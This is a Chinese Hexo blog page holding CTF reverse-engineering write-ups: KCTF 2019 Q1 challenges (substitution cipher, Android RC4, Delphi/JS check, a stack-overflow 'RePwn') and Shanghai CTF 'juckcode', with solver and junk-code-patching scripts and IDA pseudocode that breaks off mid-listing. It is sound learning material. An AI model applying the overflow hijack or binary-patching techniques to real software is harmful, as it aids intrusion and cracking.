<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="utf-8">
  

  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://yoursite.com/page/5/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="default">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Hexo">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
</head>
</html>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-kctf2019-q1" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/07/29/kctf2019-q1/" class="article-date">
  <time datetime="2019-07-28T17:11:01.702Z" itemprop="datePublished">2019-07-29</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/RE/">RE</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/07/29/kctf2019-q1/">kctf2019-晋级赛Q1</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="第一题-流浪者"><a href="#第一题-流浪者" class="headerlink" title="第一题 流浪者"></a>第一题 流浪者</h1><ul>
<li>一个单表替换,输入范围是0-9,a-z,A-Z,分别对应表的0 - 9,10 - 35,36 - 61</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">table = <span class="string">"abcdefghiABCDEFGHIJKLMNjklmn0123456789opqrstuvwxyzOPQRSTUVWXYZ"</span></span><br><span class="line">s = <span class="string">"KanXueCTF2019JustForhappy"</span></span><br><span class="line">ff = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    ff.append(table.index(i))</span><br><span class="line"></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ff:</span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> &lt;= i &lt;= <span class="number">9</span>:</span><br><span class="line">        flag += chr(i + <span class="number">48</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="number">9</span> &lt; i &lt;= <span class="number">35</span>:</span><br><span class="line">        flag += chr(i + <span class="number">87</span>)</span><br><span class="line">    <span class="keyword">elif</span> i &gt; <span class="number">36</span>:</span><br><span class="line">        flag += chr(i + <span class="number">29</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>

<h1 id="第二题-变形金刚"><a href="#第二题-变形金刚" class="headerlink" title="第二题 变形金刚"></a>第二题 变形金刚</h1><ul>
<li>安卓逆向,解压apk,拿出来class.dex</li>
<li>将dex反编译成.jar文件,解压以后获得class文件,放入IDEA中,发现没有什么运算的过程,找到so文件,去查了一下,可以找到里面有一个类似于rc4的运算,还有一个字符串异或解密的函数,逐一解密后得到几个字符串,对应的分别是一串uuid,一串字符被base64部分引用,而这个base64也是魔改过的</li>
<li>在sub_784中,可以看到另外的rc4部分,但是rc4也是被改过了一些.直接复现算法即可,最后在模拟器中输入就看到flag字样弹出</li>
</ul>
<h1 id="第三题-影分身之术"><a href="#第三题-影分身之术" class="headerlink" title="第三题 影分身之术"></a>第三题 影分身之术</h1><ul>
<li>这个题目出的非常的神奇了,之前没有逆过delphi,所以还是有一点难度</li>
<li>程序是一个窗口,输入以后点击check,会有一个弹窗提示wrong,查看了一下内置字符串,发现了一些script的东西,确定了一下是js</li>
<li>后面就比较神奇了,程序用到的数据写到了代码段里,这个在逆向的时候就有一些小干扰了..,在字符串中,可以看到<code>&lt;input type=button value=&quot;checkMyFlag&quot; onclick=&quot;ckpswd();&quot;&gt;</code>的字符串,按钮事件</li>
<li>在程序中可以在492BA8的位置看到一段js代码,大概内容是eval(packed),其实就是js混淆,寻找在线网站即可解密这段代码</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ckpswd</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    key = <span class="string">"simpower91"</span>;</span><br><span class="line">    a = <span class="built_in">document</span>.all.pswd.value;</span><br><span class="line">    <span class="keyword">if</span> (a.indexOf(key) == <span class="number">0</span>) &#123;</span><br><span class="line">        l = a.length;</span><br><span class="line">        i = key.length;</span><br><span class="line">        sptWBCallback(a.substring(i, l));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        alert(<span class="string">"wrong!&lt;"</span> + a + <span class="string">"&gt; is not my GUID ;-)"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"1234"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ok</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    alert(<span class="string">"congratulations!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>其实就是个字符串比较函数,所以可以知道前几位是simpower91,输入后没有什么反应,于是继续跟进</li>
<li>在后面程序会检查属否存在data.txt并且打开读取文件,不过好像没有什么影响= =,但是会看到一个比较长度是否等于4的运算,也就是输入是simpower91 + xxxx.</li>
<li>程序在0xa4000的位置做了一些数据操作,在函数4734b0中,还有一些写入0x90,0xc3的循环,跟进发现跳出这个函数以后的sub_4734B0中<code>jmp     [esp-4+var_40]</code>,是一个向刚才的虚拟空间的跳转,跟进进刚才写入的数据可以看到在执行逐位对比的操作,从eax,edx寄存器中可以找到数据,将每位加上7f就能拿到后四位</li>
<li>提取数据逆向得到后四位a123,输入验证通过</li>
</ul>
<h1 id="第六题-RePwn"><a href="#第六题-RePwn" class="headerlink" title="第六题 RePwn"></a>第六题 RePwn</h1><ul>
<li>这是一个比较神奇的题目,有好多组多解= =</li>
<li>题目逻辑不是很难,输入一个字符串,进行一个明文字符串比较.</li>
<li>跟到里面,是一个类似于方程的东西,变量是输入的前8个字符,根据约束条件很容易用z3等约束求解器解出来</li>
<li>到了后面,将输入的最后四个字节进行了简单的减法运算,然后将flag拷贝进栈内,注意这里存在一个溢出,只要构造后四个字节,就可以劫持执行流</li>
<li>具体劫持到哪里呢,搜索字符串发现了一个加密过的字符串,按照xref找到的运算,异或回去可以看到这就是提示correct的字符串,向上回溯,找到sub_401BF0</li>
<li>后四位注意小段序,可以算出来实际上就是HaCk,继续整理函数,发现了des的几个特征变量以及运算,后调试得知就是des,按照规则反解即可得到第二个flag,拼接起来就是可以提交的flag了</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/07/29/kctf2019-q1/" data-id="cjyn83qem001bicthg4u5ey6x" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-juckcode" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/07/29/juckcode/" class="article-date">
  <time datetime="2019-07-28T17:11:01.696Z" itemprop="datePublished">2019-07-29</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/RE/">RE</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/07/29/juckcode/">上海市ctf-re200-juckcode</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="正向解析juckcode"><a href="#正向解析juckcode" class="headerlink" title="正向解析juckcode"></a>正向解析juckcode</h1><p> 一个二进制文件和一份加密后的flag,显然逆算法,扔进IDA,各种分析不出函数…怎么回事呢用OD打开查看下,有好多段可疑的汇编指令大概是pushad jmp 大量无用代码 popad<br> 花指令get,写脚本全部nop掉,用IDA打开处理好的文件,发现,居然还是不能F5,又发现了一段异常代码,两个jmp一个E8,nop掉E8居然就可以了,OD启动,提取目标的一段字节码.<br> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> b = <span class="string">'\x60\xE9\x31\x00\x00\x00\x8B\xEC\x6A\xFF\x68\x33\x22\x11\x00\x68\x11\x22\x33\x00\x64\xA1\x00\x00\x00\x00\x50\x64\x89\x25\x00\x00\x00\x00\x58\x64\xA3\x00\x00\x00\x00\x58\x58\x58\x58\x8B\xE8\xB8\x50\x10\x40\x00\x50\xE8\xC3\x61'</span></span><br><span class="line">a = <span class="string">'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'</span></span><br><span class="line">c = <span class="string">'\x0F\x8E\x07\x00\x00\x00\x0F\x85\x01\x00\x00\x00\xE8'</span></span><br><span class="line">d = <span class="string">'\x0F\x8E\x07\x00\x00\x00\x0F\x85\x01\x00\x00\x00\x90'</span></span><br><span class="line">f = open(<span class="string">'juckcode.exe'</span>, <span class="string">'rb'</span>)</span><br><span class="line">da = f.read()</span><br><span class="line"><span class="keyword">print</span> da.count(b)</span><br><span class="line"><span class="keyword">print</span> da.count(c)</span><br><span class="line">da = da.replace(b,a).replace(c,d)</span><br><span class="line"><span class="keyword">print</span> da.count(b)</span><br><span class="line"><span class="keyword">print</span> da.count(c)</span><br><span class="line">w = open(<span class="string">'bacjuck.exe'</span>, <span class="string">'wb'</span>)</span><br><span class="line">w.write(da)</span><br><span class="line">w.close()</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure></p>
<p> 处理后成功看到伪代码.程序是C++写的,而且封装贼鸡儿恶心,不过大概看到了一些可以看的懂的函数.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// ST10_4</span></span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// ST10_4</span></span><br><span class="line">  <span class="keyword">char</span> *v6; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// ST10_4</span></span><br><span class="line">  <span class="keyword">char</span> *v8; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// ST10_4</span></span><br><span class="line">  <span class="keyword">char</span> *v11; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v13; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// ST10_4</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v17; <span class="comment">// [esp+10h] [ebp-9DCh]</span></span><br><span class="line">  <span class="keyword">char</span> v18; <span class="comment">// [esp+28h] [ebp-9C4h]</span></span><br><span class="line">  <span class="keyword">char</span> v19; <span class="comment">// [esp+40h] [ebp-9ACh]</span></span><br><span class="line">  <span class="keyword">int</span> v20; <span class="comment">// [esp+58h] [ebp-994h]</span></span><br><span class="line">  <span class="keyword">int</span> v21; <span class="comment">// [esp+5Ch] [ebp-990h]</span></span><br><span class="line">  <span class="keyword">char</span> *v22; <span class="comment">// [esp+60h] [ebp-98Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v23; <span class="comment">// [esp+64h] [ebp-988h]</span></span><br><span class="line">  BOOL v24; <span class="comment">// [esp+68h] [ebp-984h]</span></span><br><span class="line">  <span class="keyword">char</span> *v25; <span class="comment">// [esp+6Ch] [ebp-980h]</span></span><br><span class="line">  <span class="keyword">char</span> *v26; <span class="comment">// [esp+70h] [ebp-97Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> m; <span class="comment">// [esp+74h] [ebp-978h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> j; <span class="comment">// [esp+78h] [ebp-974h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [esp+7Ch] [ebp-970h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> n; <span class="comment">// [esp+80h] [ebp-96Ch]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v31; <span class="comment">// [esp+84h] [ebp-968h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> k; <span class="comment">// [esp+88h] [ebp-964h]</span></span><br><span class="line">  <span class="keyword">bool</span> v33; <span class="comment">// [esp+8Fh] [ebp-95Dh]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> l; <span class="comment">// [esp+90h] [ebp-95Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v35; <span class="comment">// [esp+94h] [ebp-958h]</span></span><br><span class="line">  <span class="keyword">char</span> v36; <span class="comment">// [esp+14Ch] [ebp-8A0h]</span></span><br><span class="line">  <span class="keyword">char</span> v37; <span class="comment">// [esp+164h] [ebp-888h]</span></span><br><span class="line">  <span class="keyword">char</span> v38; <span class="comment">// [esp+17Ch] [ebp-870h]</span></span><br><span class="line">  <span class="keyword">char</span> v39; <span class="comment">// [esp+194h] [ebp-858h]</span></span><br><span class="line">  <span class="keyword">char</span> v40; <span class="comment">// [esp+1ACh] [ebp-840h]</span></span><br><span class="line">  <span class="keyword">char</span> input; <span class="comment">// [esp+1C4h] [ebp-828h]</span></span><br><span class="line">  <span class="keyword">char</span> v42; <span class="comment">// [esp+1DCh] [ebp-810h]</span></span><br><span class="line">  <span class="keyword">char</span> v43; <span class="comment">// [esp+1DDh] [ebp-80Fh]</span></span><br><span class="line">  <span class="keyword">char</span> Src; <span class="comment">// [esp+5DCh] [ebp-410h]</span></span><br><span class="line">  <span class="keyword">char</span> Dst; <span class="comment">// [esp+5DDh] [ebp-40Fh]</span></span><br><span class="line">  <span class="keyword">char</span> v46; <span class="comment">// [esp+5DEh] [ebp-40Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v47[<span class="number">1021</span>]; <span class="comment">// [esp+5DFh] [ebp-40Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v48; <span class="comment">// [esp+9E8h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  sub_4038A0(<span class="number">0xB8</span>u);</span><br><span class="line">  sub_4039F0(<span class="string">"./flag"</span>, <span class="number">1</span>, <span class="number">64</span>, <span class="number">1</span>);</span><br><span class="line">  v48 = <span class="number">0</span>;</span><br><span class="line">  sub_401E00(&amp;input);</span><br><span class="line">  LOBYTE(v48) = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> __int8)sub_403970(&amp;v35) )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_4050D0(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"error in open flag."</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_405410(&amp;v35, &amp;input);</span><br><span class="line">  v3 = len(&amp;input);</span><br><span class="line">  v4 = (<span class="keyword">char</span> *)sub_4038C0(&amp;input);</span><br><span class="line">  base64encode((<span class="keyword">int</span>)&amp;v40, v4, v3);</span><br><span class="line">  LOBYTE(v48) = <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; len(&amp;input); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v26 = sub_401C80(&amp;input, i);</span><br><span class="line">    *v26 += <span class="number">64</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v5 = len(&amp;input);</span><br><span class="line">  v6 = (<span class="keyword">char</span> *)sub_4038C0(&amp;input);</span><br><span class="line">  base64encode((<span class="keyword">int</span>)&amp;v36, v6, v5);</span><br><span class="line">  LOBYTE(v48) = <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; len(&amp;input); ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v25 = sub_401C80(&amp;input, j);</span><br><span class="line">    *v25 &lt;&lt;= <span class="number">7</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v7 = len(&amp;input);</span><br><span class="line">  v8 = (<span class="keyword">char</span> *)sub_4038C0(&amp;input);</span><br><span class="line">  base64encode((<span class="keyword">int</span>)&amp;v37, v8, v7);</span><br><span class="line">  LOBYTE(v48) = <span class="number">4</span>;</span><br><span class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; len(&amp;input); ++k )</span><br><span class="line">  &#123;</span><br><span class="line">    v9 = *sub_401C80(&amp;input, k) - <span class="number">158</span>;</span><br><span class="line">    *sub_401C80(&amp;input, k) = v9;</span><br><span class="line">  &#125;</span><br><span class="line">  v10 = len(&amp;input);</span><br><span class="line">  v11 = (<span class="keyword">char</span> *)sub_4038C0(&amp;input);</span><br><span class="line">  base64encode((<span class="keyword">int</span>)&amp;v38, v11, v10);</span><br><span class="line">  LOBYTE(v48) = <span class="number">5</span>;</span><br><span class="line">  Src = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;Dst, <span class="number">0</span>, <span class="number">0x3FF</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( l = <span class="number">0</span>; l &lt; len(&amp;v40); ++l )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *sub_401C80(&amp;v40, l) != <span class="number">61</span> )</span><br><span class="line">      *(&amp;Src + <span class="number">4</span> * l) = *sub_401C80(&amp;v40, l);</span><br><span class="line">    *(&amp;Dst + <span class="number">4</span> * l) = *sub_401C80(&amp;v36, l);</span><br><span class="line">    v47[<span class="number">4</span> * l] = *sub_401C80(&amp;v37, l);</span><br><span class="line">    *(&amp;v46 + <span class="number">4</span> * l) = *sub_401C80(&amp;v38, l);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_401D90(&amp;Src);</span><br><span class="line">  LOBYTE(v48) = <span class="number">6</span>;</span><br><span class="line">  sub_4017D0(&amp;v39, &amp;v19);</span><br><span class="line">  LOBYTE(v48) = <span class="number">8</span>;</span><br><span class="line">  <span class="built_in">std</span>::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::~basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v19);</span><br><span class="line">  v42 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v43, <span class="number">0</span>, <span class="number">0x3FF</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( m = <span class="number">0</span>; ; ++m )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_401D90(&amp;Src);</span><br><span class="line">    LOBYTE(v48) = <span class="number">9</span>;</span><br><span class="line">    v12 = sub_4017D0(&amp;v17, &amp;v18);</span><br><span class="line">    v23 = v12;</span><br><span class="line">    v13 = len(v12);</span><br><span class="line">    v24 = m &lt; v13;</span><br><span class="line">    v33 = m &lt; v13;</span><br><span class="line">    <span class="built_in">std</span>::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::~basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v17);</span><br><span class="line">    LOBYTE(v48) = <span class="number">8</span>;</span><br><span class="line">    <span class="built_in">std</span>::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::~basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v18);</span><br><span class="line">    <span class="keyword">if</span> ( !v33 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v14 = (<span class="keyword">unsigned</span> __int8)*sub_401C80(&amp;v39, m);</span><br><span class="line">    sub_405BA0(&amp;v42, <span class="number">1024</span>, <span class="string">"%s%.2hhx"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;v42);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( n = <span class="number">0</span>; ; ++n )</span><br><span class="line">  &#123;</span><br><span class="line">    v31 = &amp;v42;</span><br><span class="line">    v22 = &amp;v43;</span><br><span class="line">    v31 += <span class="built_in">strlen</span>(v31);</span><br><span class="line">    v21 = ++v31 - &amp;v43;</span><br><span class="line">    <span class="keyword">if</span> ( n &gt;= v31 - &amp;v43 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(&amp;v42 + n) += <span class="number">16</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v15 = sub_4050D0(<span class="built_in">std</span>::<span class="built_in">cout</span>, &amp;v42);</span><br><span class="line">  <span class="built_in">std</span>::basic_ostream&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;::<span class="keyword">operator</span>&lt;&lt;(v15, sub_405430);</span><br><span class="line">  v20 = <span class="number">0</span>;</span><br><span class="line">  LOBYTE(v48) = <span class="number">5</span>;</span><br><span class="line">  <span class="built_in">std</span>::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::~basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v39);</span><br><span class="line">  LOBYTE(v48) = <span class="number">4</span>;</span><br><span class="line">  <span class="built_in">std</span>::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::~basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v38);</span><br><span class="line">  LOBYTE(v48) = <span class="number">3</span>;</span><br><span class="line">  <span class="built_in">std</span>::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::~basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v37);</span><br><span class="line">  LOBYTE(v48) = <span class="number">2</span>;</span><br><span class="line">  <span class="built_in">std</span>::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::~basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span 